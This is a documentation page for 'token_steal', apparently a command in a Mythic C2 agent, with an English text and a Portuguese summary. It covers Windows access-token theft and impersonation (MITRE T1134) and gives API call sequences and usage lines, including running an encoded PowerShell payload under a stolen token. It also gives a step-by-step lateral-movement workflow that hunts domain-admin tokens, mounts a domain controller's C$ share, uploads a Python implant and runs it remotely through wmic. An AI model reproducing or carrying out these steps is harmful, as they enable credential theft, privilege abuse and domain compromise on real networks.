+++
title = "token_steal"
chapter = false
weight = 100
hidden = false
+++

## Summary

Performs **Access Token Manipulation** (T1134) to steal and impersonate the security token of a running process. Enables lateral movement by making subsequent network authentication (SMB, LDAP, WMI, RPC) use the stolen token — without spawning any new credential prompt or requiring the plaintext password.

- **Platform**: Windows only
- **Needs Admin**: No (SeImpersonatePrivilege — enabled automatically via `RtlAdjustPrivilege`)
- **MITRE ATT&CK**: T1134, T1134.001, T1134.002
- **Dependencies**: Pure ctypes
- **Version**: 1.0
- **Author**: @wtechsec

### Arguments

#### pid *(optional)*
- Description: PID of the process to steal the token from. `0` or empty = list mode.
- Required: No
- Default: `0`

#### command *(optional)*
- Description: Command to execute using the stolen token (stdout/stderr captured). Empty = impersonate current thread only.
- Required: No
- Default: (empty)

## Usage

```
# List all processes and their token users
token_steal

# Steal token from PID 1234 — impersonate in current thread
# (network auth via SMB/LDAP/WMI will use this token)
token_steal 1234

# Steal token from PID 1234 and execute a command as that user
token_steal 1234 cmd /c whoami /all
token_steal 1234 cmd /c net use \\dc01\SYSVOL
token_steal 1884 powershell -enc <base64_payload>
```

## Technique Detail

```
Mode 1 — List:
  Enumerate all processes → OpenProcessToken(TOKEN_QUERY) → LookupAccountSid
  → show PID / process name / token user

Mode 2 — Impersonate (no command):
  RtlAdjustPrivilege(SeImpersonate=29)
  OpenProcess(target_pid, PROCESS_QUERY_INFORMATION)
  OpenProcessToken(TOKEN_DUPLICATE | TOKEN_QUERY)
  DuplicateTokenEx(SecurityImpersonation, TokenImpersonation)
  ImpersonateLoggedOnUser(dup_token)
  → current thread now authenticates as stolen user on the network

Mode 3 — Execute (with command):
  RtlAdjustPrivilege(SeImpersonate=29)
  OpenProcessToken → DuplicateTokenEx(TokenPrimary)
  CreatePipe × 2 (stdout + stderr capture)
  CreateProcessWithTokenW(primary_token, CREATE_NO_WINDOW, STARTF_USESTDHANDLES)
  WaitForSingleObject → ReadFile pipes
  → output returned to Mythic
```

## MITRE ATT&CK Mapping

- **T1134** — Access Token Manipulation
- **T1134.001** — Token Impersonation/Theft
- **T1134.002** — Create Process with Token

## Notes

- **SeImpersonatePrivilege** is required. The command automatically enables it via `RtlAdjustPrivilege(29)`. This privilege is present by default on: LOCAL SERVICE, NETWORK SERVICE, IIS application pools, service accounts, and SYSTEM.
- **List mode** (`pid=0`) shows which domain users/service accounts have active processes — this is the primary way to identify valuable tokens.
- **Impersonate mode** affects network authentication only. Local `whoami` will still show the original process user; network connections will authenticate as the impersonated user.
- **Execute mode** uses `CreateProcessWithTokenW`, which requires SeImpersonatePrivilege and targets processes running as the stolen token user.
- **Revert impersonation** after use: `eval_code ctypes.windll.advapi32.RevertToSelf()`
- Credential Guard does **not** block this technique — tokens in active processes are always accessible if you have SeImpersonatePrivilege.

### Lateral Movement Flow

```
1. token_steal                    → find domain admin / service account processes
2. token_steal <pid>              → impersonate that token in current thread
3. shell net use \\dc01\C$ ...   → SMB auth uses impersonated token
   shell dir \\dc01\C$            → access internal resources as domain user
4. upload anubis2.py → \\dc01\C$\Windows\Temp\   → stage on DC
5. shell wmic /node:dc01 process call create "python C:\Windows\Temp\anubis2.py"
6. eval_code ctypes.windll.advapi32.RevertToSelf()   → clean up
```

---

## Resumo em Português (PT-BR)

Realiza **manipulação de token de acesso** (T1134) roubando e impersonando o token de segurança de um processo em execução. Permite movimentação lateral fazendo com que autenticações de rede subsequentes (SMB, LDAP, WMI) usem o token roubado — sem senha em texto claro.

### Modos de operação

| Modo | Uso | Efeito |
|---|---|---|
| **List** | `token_steal` | Lista processos e usuários de token disponíveis |
| **Impersonate** | `token_steal <pid>` | Thread atual passa a usar o token para auth de rede |
| **Execute** | `token_steal <pid> <cmd>` | Executa comando como o usuário do token, captura output |

### Fluxo de movimentação lateral

```
1. token_steal → identificar processo de domain admin/service account
2. token_steal <pid> → impersonar token no thread atual
3. shell net use \\servidor\C$ → auth SMB usa token impersonado
4. upload anubis.py → \\servidor\C$\Temp\ → staging no host lateral
5. shell wmic /node:servidor process call create "python C:\Temp\anubis.py"
6. eval_code ctypes.windll.advapi32.RevertToSelf() → reverter impersonação
```

### Reverter impersonação

```
eval_code ctypes.windll.advapi32.RevertToSelf()
```
